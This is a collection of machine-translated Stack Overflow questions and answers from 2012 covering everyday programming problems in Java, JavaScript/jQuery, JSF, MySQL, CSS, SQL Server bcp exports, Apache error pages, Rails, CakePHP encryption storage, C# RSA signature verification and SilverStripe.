# java - 推土机：将字段映射到函数输出

> ID：11847623
> 
> 赞同：0
> 
> 时间：2012-08-07T13:57:51.810
> 
> 标签：java, dozer

我正在使用 Dozer 进行对象映射。一切都很好，只是我无法映射这个特定的东西。

```
<mapping>
<class-a>User</class-a>
<class-b>UAUserBean</class-b>
<field>
<a>RightLst.Right</a>
<b>Rights</b>
<a-hint>Right</a-hint>
<b-hint>UARightBean</b-hint>
</field>
<field>
<a>RightLst.NumInLst</a> 
<b>Rights.length</b> 
</field>
</mapping>

//here RightLst is an object of a class and numInLst (int prop)
//rights is an array of objects 
```

我想做的是

```
lUser.getRightLst().setNumInLst(uaUserBean.getRights().length); 
```

有什么建议么？？

提前致谢。

* * *

```
User{ 
protected RightLst rightLst;
}

RightLst{
protected Integer numInLst;
protected Collection right = new ArrayList();
}

public class UAUserBean{
private UARightBean[] rights;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T16:05:33.650

当你这样做时：

```
...
   <b>rights.length</b> 
</field> 
```

Dozer 将尝试访问数组的第一个位置，并在（这是数组的类型）的实例上调用*length*`rights`属性的 getter ，显然*length*属性不存在并且 Dozer 会抛出异常。***`UARightBean`*****`UARightBean`****

 **我建议创建一个 getter 方法**`UAUserBean`**来返回`rights`属性的长度，它看起来像这样：

```
 class UAUserBean {
        ... 
        public int getRightsLength() {
            return rights != null ? rights.length : 0;
        }       
    } 
```

映射文件：

```
<class-a>User</class-a>
<class-b>UAUserBean</class-b>
<field>
    <a>rightLst.numInLst</a> 
    <b>rightsLength</b> 
</field> 
```

If you can't modify **`UAUserBean`**, your last option would be a custom converter from `UARightBean[]` to `Integer`, but it would look ugly.**

# javascript - 转换/格式化日期对象

> ID：11847624
> 
> 赞同：0
> 
> 时间：2012-08-07T13:57:54.310
> 
> 标签：javascript, jquery

我正在开发一个 jquery 日历脚本。在脚本中，选择一行会给出一个日期对象作为回调。

```
select: function(start, end, allDay) {
                       $("#datepicker_add").val(start);
                       $("#datepicker_add_end").val(end);
                    calendar.fullCalendar('renderEvent',
                        {
                            title: title,
                            start: start,
                            end: end,
                            allDay: allDay
                        },
                        true // make the event "stick"
                    );

                calendar.fullCalendar('unselect');
            }, 
```

在这里，`start`对象`end`就像那样`Wed Aug 22 2012 00:00:00 GMT+0300 (EEST)` 我想要的是将其格式化为`Y-m-d`

我怎样才能做到这一点 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:07:27.610

```
var date = new Date("Wed Aug 22 2012 00:00:00 GMT+0300 (EEST)");
var dateString = date.getFullYear() + "-" + (date.getMonth()+1) + "-" + (date.getDate()+1);
console.log(dateString); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:10:46.403

如果你也使用 Jquery UI，你可以使用 DataPicker 的静态转换方法：

```
$.datepicker.formatDate('mm-dd-yy', DateToConvert); //requires jquery ui 
```

您还可以创建一个新的 Javascript 日期对象并从一开始就传入您想要的对象，或者使用各种“get”函数来提取您想要的部分并根据需要重新组装：

[http://www.w3schools.com/js/js_obj_date.asp](http://www.w3schools.com/js/js_obj_date.asp)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T14:19:20.670

你可以使用我之前制作的这个库

[http://code.google.com/p/javascript-date-util/](http://code.google.com/p/javascript-date-util/)

你可以检查一个调用的函数`getDayString(date, separator)` ，你可以将你想要字符串化的日期和你想要的分隔符发送给它。

# jsf - 转发模板参数和定义

> ID：11847627
> 
> 赞同：1
> 
> 时间：2012-08-07T13:58:11.067
> 
> 标签：jsf, facelets

考虑一个嵌套模板：

**基础.xhtml：**

```
...

<h:outputText value="#{uiParamter}"/>
<ui:insert name="header"/>

... etc. 
```

**布局.xhtml：**

```
<ui:composition template="Base.xhtml">

    ...

    <ui:insert name="content"/>

    ... etc.

</ui:composition> 
```

现在像这样定义模板客户端时：

```
<ui:composition template="Layout.xhtml">

    <ui:define name="header"> foo </ui:define>
    <ui:define name="content"> foo2 </ui:define>
    <ui:param name="uiParameter" value="foo3"/>

</ui:composition> 
```

是否必须通过重新定义将模板中的`<ui:param>`或转发到模板。例如：`<ui:define>``Layout.xhtml``Base.xhtml`

```
<ui:param name="uiParameter" value="#{uiParameter}">  
<ui:define name="header">
    <ui:insert name="header"/>
</ui:define> 
```

也可以将这个问题改写为：*“模板参数是否具有级联行为？”*

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-12T15:25:58.197

答案是肯定的。我在 JBoss AS 7.0 上运行了以下代码：

**巢1.xhtml：**

```
 <!DOCTYPE html>
    <html xmlns="http://www.w3.org/1999/xhtml"
        xmlns:h="http://java.sun.com/jsf/html"
        xmlns:ui="http://java.sun.com/jsf/facelets">

    <h:head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title><ui:insert name="title">
                Nested
            </ui:insert></title>
    </h:head>

    <h:body>
        <ui:insert name="main" />
        <h:outputText value="#{uiParam}"/>
    </h:body>

</html> 
```

**巢2.xhtml：**

```
<ui:composition xmlns="http://www.w3.org/1999/xhtml"
    xmlns:ui="http://java.sun.com/jsf/facelets" template="nest1.xhtml">

    <ui:define name="main">
        <p>Nested templated content.</p>
    </ui:define>
</ui:composition> 
```

**巢3.xhtml：**

```
<ui:composition xmlns="http://www.w3.org/1999/xhtml"
    xmlns:ui="http://java.sun.com/jsf/facelets" template="nest2.xhtml">

    <ui:define name="title">Nested Template</ui:define>
    <ui:param name="uiParam" value="ui param value" />
</ui:composition> 
```

呈现为：

![jboss输出截图](../Images/c876b3ea76fca9a1221091bab83dc70b.png)

# jquery - 如何在 jquery 中检查图像文件的大小？

> ID：11847629
> 
> 赞同：-1
> 
> 时间：2012-08-07T13:58:16.303
> 
> 标签：jquery, image, image-size

单击该按钮时我有一个按钮，我需要获取图像文件大小

```
function attachPhoto()
{
    var path="http://www.w3schools.com/images/pulpit.jpg";// i need to check size of image
}

<input type="button" style="width:30%" onClick=" attachPhoto()" /> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:00:11.730

`$('image').width()`和`$('image').height()`

只有在它完全加载之后（也许将它附加到`.load()`事件中）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:06:52.730

这是一个非 jQuery 解决方案：

```
function attachPhoto() {
    var img = new Image();
    img.onload = function() {
        alert([img.width, img.height]);
    } 
    img.src = "http://www.w3schools.com/images/pulpit.jpg";
} 
```

请注意，图像大小*仅*在文件加载后可用，并且`onload`回调将被*异步*调用。如果您希望在知道必须从该回调*内部触发的大小后发生其他事情。*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T13:59:24.523

`$('element').width()` 或者`$('element').height()`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-07T14:03:42.070

如果您想仅使用 URL 获取文件的尺寸，则需要使用 PHP 等外部语言。jQuery 无法检索文件属性。

一种方法是将图像加载到屏幕外的某个位置并获取 $('image').width() & $('image').height() ，但这不是一种理想的方式。

最好的方法是对 php 脚本使用 ajax 调用，该脚本将检查文件的尺寸并将其返回给 jQuery。

您可以访问 php 服务器吗？

# mysql - 如何设计联系人数据库并为每个用户存储多个行项目？

> ID：11847630
> 
> 赞同：1
> 
> 时间：2012-08-07T13:58:20.007
> 
> 标签：mysql, database-design, many-to-many

我想创建一个小型发票应用程序。我的第一步是创建一个包含两个表的数据库，其中每个客户可以有多个地址和电话号码。

我认为在这里假设我正在处理一段`one to many`关系是安全的。但是我应该如何设计表格和字段，以便它们可以为每个用户存储多个地址和电话号码？多重我也意味着不确定，因为所以我不能只在我的表中有 x no 列。Off Hand，这就是我的想法：

```
Clients
- Id
- Notes

CONTACTS
- id
- client_id
- address
- phone number 
```

现在我试图避免像这样的第三个连接表：

```
Clients_Contacts
- id
- client_id
- contact id 
```

因为我仍然想要 and 之间的一对多而不是`many to many`关系。我思考这个问题的方式有问题吗？有人可以帮我设计这个数据库并向我展示查询多个地址的示例查询是什么样子的。`contacts``clients`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T14:06:27.973

你为什么需要一个连接表？

我会

```
Client
- ID (PK, FK of Contact)
- Notes

Contact
- ID (PK)
- client_id
- address
- phone_number 
```

然后只需将客户端的 ID 设置为联系信息中的 client_id 的值。

这样，多个联系人记录可以具有相同的 client_id。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T14:08:09.703

您的第一个想法看起来很适合您的用例（一对多）。如果您想要不想要的多对多关系，则只需要第三个连接表。

从特定客户端获取所有地址的示例查询将是：

```
SELECT address FROM Contacts WHERE client_id = 1 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-07T14:09:10.020

You say you want to store multiple addresses and phone numbers per user (= client, I assume?). Your current model already supports this. Every client can have as many contacts as needed (each contact would have the client_id set to the client's id). Only if you want to assign a single contact (address/phone number) to multiple clients as well would you need the third table.

# css - CSS 中的重叠规则——背后的真正逻辑是什么？

> ID：11847636
> 
> 赞同：7
> 
> 时间：2012-08-07T13:58:33.807
> 
> 标签：css, css-selectors

考虑以下：

```
<td class="datepickerDisabled"><a href="#"><span>12</span></a></td> 
```

在我的 css 中，有两个规则可以匹配这个选择器：

```
tbody.datepickerDays td:hover {
  border-radius: 2px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  background-color: #ddd;
} 
```

第二个是：

```
td.datepickerDisabled:hover {
  background-color: white;
} 
```

`background-color`设置为的第二条规则`white`不匹配。我认为这将是覆盖先前规则的规则，因为它更具体（带有 class 的单元格`datepickerDisabled`）。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-07T14:05:18.513

“0,0,2,2 vs 0,0,2,1。第一个显然赢了。”

```
tbody           Element      d
.datepickerDays Class        c
td              Element      d
:hover          Pseudo-class c
                              = 0,0,2,2

td                  Element      d
.datepickerDisabled Class        c
:hover              Pseudo-class c
                              = 0,0,2,1 
```

如果您不理解这种格式，请阅读[http://www.w3.org/TR/CSS21/cascade.html#specificity](http://www.w3.org/TR/CSS21/cascade.html#specificity)：

> 选择器的特异性计算如下：
> 
> *   计数 1 如果声明来自是“样式”属性而不是带有选择器的规则，否则为 0 (= a) （在 HTML 中，元素的“样式”属性的值是样式表规则。这些规则没有选择器，所以 a=1、b=0、c=0 和 d=0。）
> *   统计选择器中 ID 属性的数量（= b）
> *   计算选择器中其他属性和伪类的数量（= c）
> *   统计选择器中元素名和伪元素的个数（=d），具体只基于选择器的形式。特别是，“[id=p33]”形式的选择器被算作属性选择器（a=0, b=0, c=1, d=0），即使 id 属性被定义为“ID " 在源文档的 DTD 中。
> 
> 连接四个数字 abcd（在具有大基数的数字系统中）给出了特异性。

如果您更喜欢图片^([来源](http://css-tricks.com/specifics-on-css-specificity/))：

![](../Images/8f07c763c4e69b2055c2dea72e1b79ea.png)

# javascript - Google Maps API 地理编码器，有边界限制

> ID：11847638
> 
> 赞同：2
> 
> 时间：2012-08-07T13:58:35.523
> 
> 标签：javascript, google-maps, google-maps-api-3, bounds, google-geocoder

我正在尝试限制从 Google Maps geocoder API 返回的地址，如下所示：

```
var geocoder = new google.maps.Geocoder();
var auVicSwLatLon = new google.maps.LatLng(-39.234713, 140.962526);
var auVicNeLatLon = new google.maps.LatLng(-33.981125, 149.975296);
var auVicLatLonBounds = new google.maps.LatLngBounds(auVicSwLatLon, auVicNeLatLon);
geocoder.geocode(
  {
    address: searchStr,
    region: 'AU',
    // bounds: auVicLatLonBounds,
  },
  function(results, status) {
    // ... do stuff here
  }
); 
```

使用区域的限制有效。但是使用 bounds 的限制不会 - 当我取消注释上面的 bounds 属性时，我没有得到任何结果。留下评论，我得到来自澳大利亚各地的结果。

我在这里做错了什么吗？

谢谢！

* * *

附加信息：

相关文档在这里：

[https://developers.google.com/maps/documentation/javascript/geocoding](https://developers.google.com/maps/documentation/javascript/geocoding)

和这里：

[https://developers.google.com/maps/documentation/javascript/reference#Geocoder](https://developers.google.com/maps/documentation/javascript/reference#Geocoder)

请注意，我使用的值`LatLngBounds`是针对维多利亚州 (VIC) 的值。这确实是我想要在这里实现的目标。因此，如果您知道实现此目的的替代方法，也请回答此问题！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-24T02:46:34.113

为什么不手动寻找满足边界要求的结果呢？

我遍历结果并使用 lat 和 lng 值检查限制区域内的第一个结果。您还可以获得所有属于内部的结果。

```
function searchFromAddress() {
    var address = document.getElementById("txtBxAddress").value;
    // Check if input is not empty
    if (address.length < 1) {
        return;
    }
    var geocoder = new google.maps.Geocoder();
    geocoder.geocode({ 'address': address },
        function (results, status) {
            if (status == google.maps.GeocoderStatus.OK) {
                var point;

                // Find first location inside restricted area
                for (var i = 0 ; i < results.length ; i++) {
                    point = results[i].geometry.location;
                    // I compare my lng values this way because their are negative
                    if (point.lat() > latMin && point.lat() < latMax && point.lng() < lngMin && point.lng() > lngMax) {
                        map.setCenter(point);
                        var marker = new google.maps.Marker({
                            position: point,
                            map: map,
                            title: "You are here",
                            icon: home_pin
                        });
                        break;
                    }
                    // No results inside our area
                    if (i == (results.length - 1)) {
                        alert("Try again");
                    }
                }
            }
        });
} 
```

# objective-c - 什么是由 GCC 或 Clang 转换成的 Objective-C 2.0 类接口和实现

> ID：11847639
> 
> 赞同：6
> 
> 时间：2012-08-07T13:58:34.937
> 
> 标签：objective-c, cocoa, objective-c-runtime

由于 Objective-C 是 C 的超集，所有 Objective-C 特定的语句都在编译 .m 文件期间转换为 C 语句（我猜是由预处理器）。因此，例如，消息表达式 like`[receiver method]`被转换为对消息传递函数的调用`objc_msgSend(receiver, selector)`。

我的问题是：如果我有这样的类定义：

```
@interface ClassA {
    int var1;
    float var2;
    id var3;
}

-(void) method1;
-(int) method2: (int) num1;
@end

@implementation ClassA
-(void) method1 {
    // Implementation of the method
}

-(int) method2: (int) num1 {
    // Implementation of the method
}

@end 
```

它被编译器转换成什么（在 2.0 版本的 Objective-C 中）？它是否被转换为对函数的调用，如`objc_allocateClassPair()`、和来自可执行文件的结构）？`class_addIvar()``class_addMethod()``objc_registerClassPair()`

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-07T14:09:17.487

> 由于 Objective-C 是 C 的超集，所有 Objective-C 特定的语句都在编译 .m 文件期间转换为 C 语句（我猜是由预处理器）。

在 1988 年确实如此。虽然 Objective-C*仍然*可以以这种方式编译，但时间不长了。

The compiler parses Objective-C, along with C and-- sometimes-- C++, and emits an abstract syntax tree [AST] that represents the post-preprocessed output. That AST includes the various Objective-C definitions quite directly.

Note that the details of GCC's compilation and LLVM's compilation are diverging.

If you look at the compiled output, you'll see that the mach-o file -- the executable product -- has various sections in the file that contain the Objective-C metadata including class definitions, selector tables, ivar layout, etc... The compiler generates this metadata into the .o file and then the linker mashes it all together, eliminates duplicate information (that isn't a duplicate symbol), and writes the mach-o.

As someone mentioned in a different question, you can use the Objective-C rewriter to rewrite Objective-C to straight C, but the resulting code is inefficient and quite a bit different than the regulation compilation pipeline.

# sql - 如何使用“bcp”实用程序在 sql server 2000 中将数据从表传输到文本文件

> ID：11847640
> 
> 赞同：0
> 
> 时间：2012-08-07T13:58:35.913
> 
> 标签：sql, sql-server, tsql, sql-server-2000

谁能知道如何在 sql server 2000 中使用“bcp”实用程序将数据从表传输到文本文件

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T17:01:21.953

```
EXEC master..xp_cmdshell'bcp "Select * from test..emp" queryout "c:\dept.txt" -c -T -x' 
```

# php - 如何 - 未找到自定义 404 php

> ID：11847642
> 
> 赞同：0
> 
> 时间：2012-08-07T13:58:40.127
> 
> 标签：php, errordocument

我在谷歌上寻找这个，发现在每个网站上都重复了一件事情。

编辑您的 .htaccess 并添加以下行：

```
ErrorDocument 404 /yourpage.php 
```

因此，例如我的页面是 error.php 所以很明显它应该是：

```
ErrorDocument 404 /error.php 
```

但是，即使我输入完整的域名，它也不起作用。它只给我内部服务器错误，我不知道如何制作它。

有小费吗？谢谢。

编辑 1：我不太确定在哪里检查这些“Apache”日志。

顺便说一句，这里是完整的 ISE 消息：

```
Internal Server Error

The server encountered an internal error or misconfiguration and was unable to complete your request.

Please contact the server administrator, *webmaster@mydomainname.com* and inform them of the time the error occurred, and anything you might have done that may have caused the error.

More information about this error may be available in the server error log.

Additionally, a 500 Internal Server Error error was encountered while trying to use an ErrorDocument to handle the request. 
```

我也尝试过制作 error.html 并且不起作用。而且我不在 htaccess 中使用任何其他重写。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:07:10.420

那么您的网络服务器不支持此选项...查看您的 http.conf 并搜索

```
AllowOverride <value> 
```

如果不等于 FileInfo 或不允许所有配置错误文档。将其更改为 All 以使其工作（然后重新启动 Apache） 如果您无权访问 http.conf，请让您的 Provider 允许自定义错误文档。

# jquery - 根据具有选定属性的选择输入更改文本框值

> ID：11847643
> 
> 赞同：10
> 
> 时间：2012-08-07T13:58:41.100
> 
> 标签：jquery, jquery-selectors

我试图根据用户从下拉列表中选择一个值来更改文本输入的值。我已经使用以下方法使其工作，

```
<script type="text/javascript">  
     $(document).ready(function() {                                       
        $("#name").live("change", function() {
          $("#firstname").val($(this).find("option:selected").attr("value"));
        })
     });                                     
</script>

<select id="name" name="name"> 
<option value="">Please select...</option> 
<option value="Elvis">Elvis</option> 
<option value="Frank">Frank</option> 
<option value="Jim">Jim</option> 
</select>

<input type="text" id="firstname" name="firstname" value="" readonly="readonly"> 
```

这一切都很好。我现在想要实现的是，如果用户希望编辑他们的选择，则在用户重新访问表单时默认显示预先选择的项目。目前选择只是默认为“请选择...”。他们是否强制选择在页面加载时显示来自文本输入的值？

谢谢

克里斯

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-07T14:00:32.593

尝试这个，

```
$(document).ready(function() {

    $("#name option").filter(function() {
        return $(this).val() == $("#firstname").val();
    }).attr('selected', true);

    $("#name").live("change", function() {

        $("#firstname").val($(this).find("option:selected").attr("value"));
    });
});
```

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.3.0/jquery.min.js"></script>
<select id="name" name="name"> 
<option value="">Please select...</option> 
<option value="Elvis">Elvis</option> 
<option value="Frank">Frank</option> 
<option value="Jim">Jim</option> 
</select>

<input type="text" id="firstname" name="firstname" value="Elvis" readonly="readonly">
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-07T14:10:56.337

```
$(document).ready(function() {   

  $(document).on("change", "#name", function() {

     $("#firstname").val( this.value ); // this.value is enough for you

  }).val( $('#firstname').val() ).change(); // for pre-selection trigger

}); 
```

### 笔记

而不是与 jQuery 1.7+ 一起`.live()`使用，因为已弃用。`.on()``live()`

`.on()`委托事件处理的语法是：

```
$(StaticParent).on( eventName, target, handlerFunction ); 
```

其中，表示要绑定事件`StaticParent`的元素的非动态父容器。`target`

因此，对于上述情况，最好使用任何静态父级`#name`而不是`document`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-07T14:09:14.460

```
$(document).ready(function() {                                       
    $("#name").live("change", function() {
      $("#firstname").val($(this).val());
    })
 }); ​ 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-07T14:15:34.413

试试这个：http: [//jsfiddle.net/ufomammut66/mw4dY/](http://jsfiddle.net/ufomammut66/mw4dY/)

基本上 onload 我只是按值选择一个选项，将其设置为选中，然后调用更改事件。您的更改事件会处理其余的事情。

```
$(document).ready(function() {                                       
  $("#name").live("change", function() {
    $("#firstname").val($(this).find("option:selected").attr("value"));
  });
  $('#name option[value=Frank]').attr('selected','selected').change();
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-07T14:08:34.633

将此代码粘贴到`$(document).ready`

```
$("#name").val($("#firstname").val()); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-07T14:10:51.590

```
$('#name').val($('#firstname').val()); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-07T14:40:10.533

要记住表单值，您可以使用[cookie 函数](http://www.quirksmode.org/js/cookies.html)：

```
$(document).ready(function() {
    var value = readCookie('fname');
    if (value) {
        $("#firstname").val(value);
        $('#name option[value="'+value+'"]').prop('selected', true);
    }
    $("#name").on("change", function() {
        var value = $(this).find("option:selected").attr("value");
        $("#firstname").val(value);
        createCookie('fname',value,31);
    });
});

function createCookie(name,value,days) {
    if (days) {
        var date = new Date();
        date.setTime(date.getTime()+(days*24*60*60*1000));
        var expires = "; expires="+date.toGMTString();
    }
    else var expires = "";
    document.cookie = name+"="+value+expires+"; path=/";
}

function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for(var i=0;i < ca.length;i++) {
        var c = ca[i];
        while (c.charAt(0)==' ') c = c.substring(1,c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
    }
    return null;
} 
```

[jsfiddle](http://jsfiddle.net/lalatino/JgSzx/) - 如果您重新访问此页面，名称将被设置回页面离开时。

# ruby-on-rails - Rails 3.1 / Ruby - 嵌套循环？

> ID：11847654
> 
> 赞同：1
> 
> 时间：2012-08-07T13:58:56.560
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3

我在使用嵌套循环时遇到了一些问题。有谁知道这样做的更好方法：

```
@product.tracks.each do |t|
    t.artists_tracks.each do |at|
        at.role = at.artist.role
        at.position = at.artist.position
        at.save
    end
end 
```

我得到一个*未定义的方法角色 =*错误

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T14:04:16.540

```
@product.tracks.each do |track|
    track.artists_tracks.each do |at|
        at.role = track.artist.role
        at.position = track.artist.position
        at.save
    end
end 
```

但是，是的.. 你肯定需要检查你的模型 attrs

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:01:16.440

一些评论：

*   如果`@product.artist_tracks`你有一个`has_many :artist_tracks, :through => :artists`.

*   `at.role = at.artist.role`. 您正在打破不重复数据的基本 SQL 规则，让其`artist`发挥作用。

# cakephp - CakePHP 2.0 Security::cipher 结果未保存

> ID：11847656
> 
> 赞同：0
> 
> 时间：2012-08-07T13:59:05.987
> 
> 标签：cakephp

我试图在我的模型的 beforeSave 方法中加密一些数据。但它没有被保存。

```
 $currentBalance = $this->find("all", array(
            "fields" => array(
                "SUM(base_amount) as 'CurrentBalance'"
            ),
            "conditions" => array(
                "Payment.user_id" => $this->data["Payment"]["user_id"]
            )
        ));

        $this->log($this->data["Payment"]);
        $this->log(Configure::read("Security.salt"));        
        $this->log(Security::cipher(implode("|", $this->data["Payment"]), Configure::read("Security.cipherSeed")));

        $this->set("balance", $currentBalance[0][0]["CurrentBalance"] + $this->data["Payment"]["base_amount"]);
        $this->set("balance_checksum", Security::cipher(implode("|", $this->data["Payment"]), Configure::read("Security.salt"))); 
```

如果我查看日志文件，我会得到某种加密数据，但都是胡言乱语。

虽然在数据库中，但我一无所获。

如果我用一个简单的字符串替换密码函数说“123”......那将被正确保存。

我已确保数据库连接是 utf8 编码的，并且数据库中的字段具有 utf8 排序规则。

对此的任何指示都会很棒

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T18:10:14.097

我已经解决了一个类似的问题。问题是加密数据创建了一些无效的 utf8 字符。比如汉字之类的。我所做的是将加密字符串转换为十六进制然后保存。当取回数据时，您可以从十六进制解码为字符，然后对其进行解密。

（在 AppModel.php 中）

```
<?php
/**
 * Encrypts a sensible string for the bd
 * @param string $toEncrypt
 * @return string  encrypted hexadecimal 
 */
function encryptCipher($toEncrypt) {
    $CipherKey = Configure::read('Security.cipherSeed');
    return bin2hex(Security::cipher($toEncrypt, $CipherKey));
}
?> 
```

（在 AppController.php 中）解密方法，其中 $this->CipherKey 以与模型完全相同的方式加载到 __construct

```
<?php function __construct(){
$this->CipherKey = Configure::read('Security.cipherSeed');
}

/**
 * The main decrypting function
 * 
 * @param string $strToDecrypt the string to be decrypted
 * @return string the decrypted string 
 */
public function decryptCipher($strToDecrypt) {
    return Security::cipher(pack("H*", $strToDecrypt), $this->CipherKey);
}
?> 
```

# c# - 如何使用 .pem 文件中提供的公钥验证签名？

> ID：11847666
> 
> 赞同：4
> 
> 时间：2012-08-07T13:59:52.163
> 
> 标签：c#, certificate

如何使用 .pem 文件中提供的公钥验证签名？

我使用流动的代码：

```
RSACryptoServiceProvider CrRsa;

var reader21 = File.OpenText(@"C:GTLpublicKey.pem");
var x = new PemReader(reader21);
var y = (RsaKeyParameters)x.ReadObject();

CrRsa = (RSACryptoServiceProvider)RSACryptoServiceProvider.Create();
RSAParameters pa = new RSAParameters();
pa.Modulus = y.Modulus.ToByteArray();
pa.Exponent = y.Exponent.ToByteArray();
CrRsa.ImportParameters(pa); 
```

`y`返回`null`，导致错误`pa.Modulus = y.Modulus.ToByteArray();`

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-09T13:38:43.010

```
RSACryptoServiceProvider RSAVerifier = new RSACryptoServiceProvider();

//Read public Key From Text File.

StreamReader PubKeyReader = File.OpenText(txtPublicKeyFile.Text);

string publicKey = PubKeyReader.ReadToEnd();

//Adding public key to RSACryptoServiceProvider object.

RSAVerifier.FromXmlString(publicKey);

//Reading the Signature to verify.

FileStream Signature = new FileStream(txtVerifySign.Text, FileMode.Open, FileAccess.Read);

BinaryReader SignatureReader = new BinaryReader(Signature);

byte[] SignatureData = SignatureReader.ReadBytes((int)Signature.Length);

//Reading the Signed File for Verification.

FileStream Verifyfile = new FileStream(txtVerifyFile.Text, FileMode.Open, FileAccess.Read);

BinaryReader VerifyFileReader = new BinaryReader(Verifyfile);

byte[] VerifyFileData = VerifyFileReader.ReadBytes((int)Verifyfile.Length);

//Comparing.

bool isValidsignature = RSAVerifier.VerifyData(VerifyFileData, "SHA1", SignatureData);

if (isValidsignature)

{

      Signature.Close();

      Verifyfile.Close();

}

else

{

    Signature.Close();

    Verifyfile.Close();

} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-03-08T14:39:18.327

我不同意提出的答案。

RSACryptoServiceProvider 无法通过“FromXMLString”读取 PEM 文件。

但是，它给了我将 PEM 文件导出为 XML 的想法。

我找到了这个[进行在线转换的网站](http://superdry.apphb.com/tools/online-rsa-key-converter)

然后它完美地工作了！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T14:07:07.160

不确定，但可能是您忘记了反斜杠的问题：

```
var reader21 = File.OpenText(@"C:\GTLpublicKey.pem");
//                               ^ 
```

# java - 如何使用Java代码和Sikuli点击菜单项

> ID：11847674
> 
> 赞同：0
> 
> 时间：2012-08-07T14:00:15.720
> 
> 标签：java, sikuli

我有一个应用程序需要能够注销，唯一的方法是单击下拉菜单中的注销选项，但是我遇到了很多问题。

我已经使用 Sikuli IDE 捕获了屏幕截图，当我从 IDE 运行我的代码时，它工作得非常好。（代码点击菜单，然后退出）

但是，当我尝试从 Java 运行代码时，它似乎选择了菜单，然后当它尝试单击注销时，菜单消失了。

我的猜测是，由于某种原因，Java 在鼠标移到“注销”按钮之前将焦点放在鼠标上，当焦点移到鼠标上时，菜单会消失，就像在其他地方单击时一样。

我还尝试让 Sikuli 多次按下向下按钮以退出，但尝试时会发生同样的事情：菜单消失。

这是我的 Java 代码。Sikuli 代码具有相同的两个单击命令：

```
@Override
   public void logout()
   {
      click("loggedInIndicator.png");
      click("logoutButton.png");
   } 
```

请帮忙！我找不到其他退出方式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T15:07:08.047

我建议您打印 Sikuli 认为与元素最匹配的图像。我的猜测是它选择了与您要单击的元素无关的屏幕部分，从而使菜单消失。

```
Match element = region.find("loggedInIndicator.png")
Screen screen = element.getScreen()
String imagePath = screen.capture(element) 
```

这会将 Sikuli 找到的元素的图像保存在系统临时目录中。由于它是一个临时文件，您当然必须将新创建的图像文件移动到另一个目录，以免它立即被删除。我发现这种情况在 Windows 上发生了好几次

# java - 将值从 jsp 传递到 servlet 使用

> ID：11847684
> 
> 赞同：1
> 
> 时间：2012-08-07T14:00:56.340
> 
> 标签：java, jsp, tomcat, servlets, href

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T14:08:06.247

使用`getParameter()`而不是`getAttribute()`.

# silverstripe - Silverstripe 中的一对一关系

> ID：11847686
> 
> 赞同：1
> 
> 时间：2012-08-07T14:01:02.600
> 
> 标签：silverstripe

我会尽量简单地说明这一点，但基本上我想要实现的就是这个。

有两种具有一对一关系的页面类型，汽车和所有者。我希望能够通过汽车页面上的下拉菜单选择车主。如果车主已经链接到另一辆车，我不希望它出现在下拉列表中。

我知道我需要一个 if 语句，但我发现很难弄清楚它应该如何进行。我按照本[教程](http://www.ssbits.com/tutorials/2010/dynamically-generating-a-dropdown-list/)创建下拉列表，效果很好。

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T19:14:37.590

您可以修改为您提供下拉值的函数。您的`DataObject::get()`调用可以对第二个参数进行过滤。只需选择 CarID 为 0 的所有所有者。

因此，从您提供的教程中，您可以使用此修改后的代码：

```
new DropdownField(
    'OwnerID',
    'Please choose an owner',
    Dataobject::get("Owner","CarID='0'")->map("ID", "Title", "Please Select")
); 
```

**2点需要注意：**

*   这假设您的 DataObjects 被调用`Car`并且`Owner`（根据需要进行更改，但将 ID 保留在名称的末尾，如上所述）

*   这可能不起作用，具体取决于您如何设置与`$has_one`DataObjects 上的分配的关系。如果表格上没有`CarID`字段`Owner`，那么此代码将无济于事（反之亦然）。在这种情况下，您必须创建一个循环遍历所有汽车的函数，然后从该 DataObjectSet 中删除`OwnerID`值为 0 的 DataObjects。如果这没有意义，请添加注释。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-07T19:37:04.353

